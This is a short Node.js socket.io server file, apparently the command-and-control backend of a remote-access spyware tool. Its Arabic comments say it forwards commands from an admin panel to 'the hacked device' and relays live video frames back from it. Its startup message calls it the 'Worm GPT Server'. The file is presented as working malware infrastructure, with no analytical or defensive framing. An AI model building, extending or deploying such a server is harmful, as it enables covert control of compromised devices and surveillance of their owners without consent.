const express = require('express');
const app = express();
const http = require('http').Server(app);
const io = require('socket.io')(http);

app.use(express.static('public'));

io.on('connection', (socket) => {
    console.log('New connection detected...');

    // استقبال الأوامر من لوحة التحكم وتمريرها فوراً للتطبيق
    socket.on('admin_command', (data) => {
        io.emit(data.command, data); // إرسال الأمر للجهاز المخترق
    });

    // استقبال البث المباشر (Video Buffer) من التطبيق
    socket.on('video_frame', (frame) => {
        io.emit('display_frame', frame);
    });
});

http.listen(8080, () => {
    console.log('Worm GPT Server is running on port 8080');
});
